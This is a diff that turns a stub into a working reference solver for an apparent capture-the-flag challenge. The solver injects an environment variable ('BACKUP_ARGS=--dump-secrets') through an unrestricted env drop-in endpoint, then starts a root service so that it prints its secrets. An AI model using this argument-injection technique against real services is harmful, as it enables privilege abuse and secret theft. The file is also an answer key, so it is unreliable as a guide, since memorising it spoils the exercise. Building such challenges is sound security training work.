@@ -1,14 +1,27 @@
 #!/usr/bin/env python3
-"""Reference solver for sysadmin-rbac-climb -- STUB. TODO: implement the exploit chain and
-print the recovered flag.
+"""Reference solver for sysadmin-schedd-systemd.
+
+The unit's env drop-in accepts any key. Inject BACKUP_ARGS=--dump-secrets, then
+start the root unit.
 
     python3 solve.py http://HOST:PORT
 """
+import json
 import sys
+import urllib.request
+
+
+def _req(url, obj=None, method="GET"):
+    data = json.dumps(obj).encode() if obj is not None else None
+    headers = {"Content-Type": "application/json"} if data else {}
+    req = urllib.request.Request(url, data=data, headers=headers, method=method)
+    return json.loads(urllib.request.urlopen(req, timeout=10).read())
 
 
 def solve(base):
-    raise SystemExit("solver not implemented for sysadmin-rbac-climb")
+    base = base.rstrip("/")
+    _req(base + "/set-env", {"key": "BACKUP_ARGS", "value": "--dump-secrets"}, "POST")
+    return _req(base + "/start")["output"]
 
 
 if __name__ == "__main__":
